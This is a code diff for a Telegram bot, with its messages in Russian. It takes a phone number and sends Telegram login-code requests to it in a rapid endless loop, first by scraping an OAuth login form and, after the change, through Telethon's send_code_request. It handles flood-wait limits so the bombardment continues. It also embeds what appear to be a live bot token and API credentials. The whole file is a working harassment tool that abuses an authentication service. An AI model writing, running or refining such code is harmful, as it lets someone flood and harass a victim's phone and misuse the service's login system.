@@ -1,15 +1,17 @@
 import asyncio
-import aiohttp
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
-from bs4 import BeautifulSoup
+from telethon import TelegramClient
+from telethon.errors import FloodWaitError
 
 BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"
+API_ID = 33180472
+API_HASH = "025b7581493ae0d83c3946f27a149057"
 
 spam_tasks = {}
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Отправь номер (например, +380963836766) — бот сам найдёт форму и отправит код.")
+    await update.message.reply_text("Отправь номер (например, +380963836766) — начну слать запросы авторизации. На телефон придёт уведомление с кнопками.")
 
 async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
@@ -34,49 +36,35 @@ async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not phone.startswith('+'):
         await update.message.reply_text("Формат: +380...")
         return
-
-    await update.message.reply_text(f"Запущено на {phone}. Парсим страницу и отправляем...")
+    await update.message.reply_text(f"Запущено на {phone}")
 
     async def spam():
         count = 0
-        base_url = "https://oauth.telegram.org/auth"
-        params = {
-            "bot_id": "1852523856",
-            "origin": "https://cabinet.presscode.app",
-            "embed": "1",
-            "return_to": "https://cabinet.presscode.app/login"
-        }
-        async with aiohttp.ClientSession() as session:
-            while True:
-                try:
-                    # 1. Загружаем страницу с формой
-                    async with session.get(base_url, params=params) as resp:
-                        html = await resp.text()
-                    soup = BeautifulSoup(html, 'lxml')
-                    form = soup.find('form')
-                    if not form:
-                        await context.bot.send_message(chat_id, "Форма не найдена, пробую прямой POST")
-                        action = "/auth/send"
-                        data = {'phone': phone}
-                    else:
-                        action = form.get('action')
-                        if not action.startswith('http'):
-                            action = base_url + action
-                        data = {}
-                        for inp in form.find_all('input'):
-                            name = inp.get('name')
-                            if name and inp.get('type') != 'submit':
-                                data[name] = inp.get('value', '')
-                        data['phone'] = phone
-
-                    async with session.post(action, data=data) as resp:
-                        status = resp.status
-                        text = await resp.text()
-                        count += 1
-                        await context.bot.send_message(chat_id, f"#{count}: {status}, {text[:40]}")
-                except Exception as e:
-                    await context.bot.send_message(chat_id, f"Ошибка: {str(e)[:30]}")
+        client = None
+        while True:
+            try:
+                if client is None:
+                    client = TelegramClient(None, API_ID, API_HASH)
+                    await client.connect()
+                await client.send_code_request(phone)
+                count += 1
+                await context.bot.send_message(chat_id, f"Запрос #{count} отправлен")
                 await asyncio.sleep(0.02)
+            except FloodWaitError as e:
+                sec = e.seconds
+                await context.bot.send_message(chat_id, f"Ожидание {sec} сек")
+                await client.disconnect()
+                client = None
+                await asyncio.sleep(sec)
+            except Exception as e:
+                err = str(e)
+                if "all available options" in err or "ResendCodeRequest" in err:
+                    await context.bot.send_message(chat_id, "Методы исчерпаны, переподключение")
+                else:
+                    await context.bot.send_message(chat_id, f"Ошибка: {err[:40]}")
+                await client.disconnect()
+                client = None
+                await asyncio.sleep(0.05)
 
     task = asyncio.create_task(spam())
     spam_tasks[chat_id] = task
